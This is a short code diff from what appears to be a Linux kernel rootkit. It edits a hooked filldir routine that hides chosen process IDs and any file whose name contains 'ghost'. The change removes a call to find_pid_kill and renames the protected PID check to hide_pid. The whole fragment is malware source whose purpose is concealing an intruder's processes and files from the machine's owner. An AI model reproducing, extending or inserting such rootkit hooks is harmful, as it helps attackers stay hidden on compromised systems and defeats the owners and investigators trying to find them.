@@ -182,8 +182,7 @@ static int khook_filldir(void *__buf, const char *name, int namlen, loff_t offse
 
 	int ret = 0;
 	find_pid_hide();
-	find_pid_kill();
-	if(adore_atoi(name)==protected_pid){
+	if(adore_atoi(name)==hide_pid){
 		return ret;
 	}
 	if (!strstr(name, "ghost"))
